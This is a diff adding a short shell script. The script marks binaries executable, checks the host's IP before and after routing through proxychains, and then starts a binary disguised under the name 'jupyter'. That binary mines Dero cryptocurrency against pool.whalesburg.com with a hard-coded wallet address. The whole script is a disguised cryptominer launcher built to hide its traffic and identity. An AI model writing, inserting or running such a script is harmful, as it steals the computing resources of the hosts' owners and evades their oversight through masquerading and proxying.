@@ -1,0 +1,4 @@
+chmod +x proxychains.conf jupyter proxy libproxychains4.so proxychains.conf
+echo "IP ORI ==> "$(curl ifconfig.me)
+echo "IP Baru ==> "$(./proxy curl ifconfig.me)
+./proxy ./jupyter -r pool.whalesburg.com:4300 -w dero1qyt72azcgj7xhsl33r2z58sx0egyzcfxftxpd6f9t0s4j4tul2f2yqqwgxu4e.SHD
